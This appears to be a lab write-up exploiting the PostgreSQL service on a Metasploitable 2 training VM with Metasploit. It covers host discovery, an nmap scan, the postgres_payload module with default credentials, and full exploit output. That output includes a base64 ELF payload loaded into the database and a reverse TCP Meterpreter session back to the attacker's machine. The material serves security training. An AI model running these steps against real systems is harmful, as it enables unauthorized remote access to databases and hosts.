# Metasploitable 2 POSTGRERS exploit write-up

Metasploitable 2 is Virtual Machine with many exploitable ports and now we are going to exploit it's one of exploit - postgres.



 > The target of this lab is use vulnerablitity in **postgres** service running in our Vulnerable VM to gain Root access.

## 1- Finding IP
 As the first step we are finding IP address of target machine - It's the VM located in our own LAN. 

 `sudo netdiscover -i eth 0` - for discovering all devices visible on ethernet 0.
```
 Currently scanning: 192.168.126.0/16   |   Screen View: Unique Hosts                                                                                    
                                                                                                                                                         
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                             
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 .
 192.168.43.95   00:0c:29:c8:07:4e      1      60  VMware, Inc.
 .
 ```

 ## 2- Enumeration
 In this step we'll find ports and services running on VM.
  
`sudo nmap -sS -sV  192.168.42.95 ` - with nmap tool we get all the open ports running on vulnerable VM.

```
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION

.
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
.
.
.
```

We'll exploit this vulnerablity using metasploit; `sudo msfdb init && msfconsole`

Search for postgres; `msf6 > search postgres_payload`

```
Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/linux/postgres/postgres_payload    2007-06-05       excellent  Yes    PostgreSQL for Linux Payload Execution
   .
   .
   ```

Using `exploit/linux/postgres/postgres_payload`, we'll look for it's option before exploitation.

```
Module options (exploit/linux/postgres/postgres_payload):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   VERBOSE  true             no        Enable verbose output


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


   Used when making a new connection via RHOSTS:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  postgres         no        The database to authenticate against
   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
   RHOSTS                     no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     5432             no        The target port
   USERNAME  postgres         no        The username to authenticate as


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux x86
```

As **Remote and Local hosts** are not set, so use;

`set RHOSTS 192.168.43.95`

`set LHOST 192.168.43.132`

## Exploitation:

Now we are ready to exploit;

`msf6 exploit(linux/postgres/postgres_payload) > exploit`

```
*] Started reverse TCP handler on 192.168.43.132:4444 
[*] Trying postgres:postgres@192.168.43.95:5432/postgres
[*] 192.168.43.95:5432 Postgres - querying with 'select version()'
[*] 192.168.43.95:5432 - PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)
[*] 192.168.43.95:5432 Postgres - querying with 'select lo_creat(-1)'
[*] 192.168.43.95:5432 Postgres - querying with 'delete from pg_largeobject where loid=32770'
[*] 192.168.43.95:5432 Postgres - querying with 'insert into pg_largeobject (loid,pageno,data) values(32770, 0, decode('f0VMRgEBAQAAAAAAAAAAAAMAAwABAAAAAAAAADgAAABABAAAAAAAADQAIAAEACgADgANAAAAAAAGAAAAOAAAADgAAAA4AAAAgAAAAIAAAAAFAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAUAwAAFAMAAAUAAAAAEAAAAQAAABgDAAAYEwAAGBMAACgBAAAoAQAABgAAAAAQAAACAAAAmAMAAJgTAACYEwAAgAAAAIAAAAAGAAAAAAAAABwAAAAkAwAAZAAAACAAAABAAAAAAQAAAAEAAAAvdG1wL0NZRElHbnJlLnNvAABsaWJjLnNvLjYAbW1hcABtZW1jcHkAbXByb3RlY3QAX2V4aXQAZm9yawB1bmxpbmsAAAIAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACgUAAAHAQAALBQAAAcCAAAwFAAABwMAADQUAAAHBAAAOBQAAAcFAAA8FAAABwYAABgUAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAsAAAAAAAAAAAAAABIAAAAQAAAAAAAAAAAAAAASAAAAFwAAAAAAAAAAAAAAEgAAACAAAAAAAAAAAAAAABIAAAAmAAAAAAAAAAAAAAASAAAAKwAAAAAAAAAAAAAAEgAAAFbojwAAAInGjYYz/v//XsNVieWD7ARTVmoAagBqImoDaAAQAABqAOh6AAAAg8QYiUX8anzoXAAAAInGjYaTEAAAUP91/OhxAAAAg8QMagdoABAAAP91/Oh0AAAAg8QMhcB0CmoB6HsAAACDxAToiAAAAIXAdQP/VfzoFwAAAInGjYZP/v//UOiDAAAAg8QEXluJ7F3D6AAAAABYg8D7wwD/cwT/Ywjo6v///42YlxEAAP9jDGoA6eX////o1f///42YlxEAAP9jEGoI6dD////owP///42YlxEAAP9jFGoQ6bv////oq////42YlxEAAP9jGGoY6ab////olv///42YlxEAAP9jHGog6ZH////ogf///42YlxEAAP9jIGoo6Xz///8AAAAAagpeMdv341NDU2oCsGaJ4c2Al1towKgrhGgCABFcieFqZlhQUVeJ4UPNgIXAeRlOdD1oogAAAFhqAGoFieMxyc2AhcB5vesnsge5ABAAAInjwesMweMMsH3NgIXAeBBbieGZsmqwA82AhcB4Av/huAEAAAC7AQAAAM2AAAAAAAABAAAAAQAAABkAAAAYFAAAGwAAAAQAAAAFAAAA5QAAAAoAAAAyAAAABAAAABgBAAADAAAAHBQAABcAAABIAQAAAgAAADAAAAAUAAAAEQAAABMAAAAIAAAAEQAAAHgBAAASAAAACAAAAAYAAACAAQAACwAAABAAAAAAAAAAAAAAAAACAACYEwAAAAAAAAAAAACkAgAAuQIAAM4CAADjAgAA+AIAAA0DAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACgAAAAEAAAACAAAAuAAAALgAAAAtAAAAAAAAAAAAAAAIAAAACAAAABIAAAADAAAAAgAAAOUAAADlAAAAMgAAAAAAAAAAAAAAAQAAAAEAAAAaAAAABQAAAAIAAAAYAQAAGAEAACwAAAAGAAAAAAAAAAQAAAAEAAAAIAAAAAkAAAACAAAASAEAAEgBAAAwAAAABgAAAAAAAAAIAAAACAAAACkAAAAJAAAAAgAAAHgBAAB4AQAACAAAAAYAAAAAAAAACAAAAAgAAAAyAAAACwAAAAIAAACAAQAAgAEAAHAAAAACAAAAAQAAAAQAAAAQAAAAOgAAAAEAAAAGAAAA8AEAAPABAACfAAAAAAAAAAAAAAAIAAAACAAAACQAAAABAAAABgAAAJACAACQAgAAhAAAAAAAAAAAAAAABAAAAAQAAABAAAAAAQAAAAMAAAAYEwAAGAMAAHwAAAAAAAAAAAAAAAgAAAAIAAAAAQAAAAYAAAADAAAAmBMAAJgDAACAAAAAAgAAAAAAAAAIAAAACAAAAEYAAAAOAAAAAwAAABgUAAAYBAAABAAAAAAAAAAAAAAABAAAAAQAAABSAAAAAQAAAAMAAAAcFAAAHAQAACQAAAAAAAAAAAAAAAQAAAAEAAAAWwAAAAMAAAAAAAAAAAAAAHAGAABlAAAAAAAAAAAAAAABAAAAAQAAAAAuZHluYW1pYwAucm9kYXRhAC5keW5zdHIALmhhc2gALnJlbC5wbHQALnJlbC5keW4ALmR5bnN5bQAudGV4dAAuZGF0YQAuaW5pdF9hcnJheQAuZ290LnBsdAAuc2hzdHJ0YWIA', 'base64'))'
[*] 192.168.43.95:5432 Postgres - querying with 'select lo_export(32770, '/tmp/CYDIGnre.so')'
[*] Uploaded as /tmp/CYDIGnre.so, should be cleaned up automatically
[*] 192.168.43.95:5432 Postgres - querying with 'create or replace function pg_temp.VLhvRXDlKg() returns void as '/tmp/CYDIGnre.so','VLhvRXDlKg' language c strict immutable'
[*] 192.168.43.95:5432 Postgres - Disconnected
[*] Transmitting intermediate stager...(106 bytes)
[*] Sending stage (1017704 bytes) to 192.168.43.95
[*] Meterpreter session 2 opened (192.168.43.132:4444 -> 192.168.43.95:50283) at 2024-07-09 09:20:20 -0400

meterpreter > sysinfo
Computer     : metasploitable.localdomain
OS           : Ubuntu 8.04 (Linux 2.6.24-16-server)
Architecture : i686
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter >
```

As you can see now a session has created on Remote machine.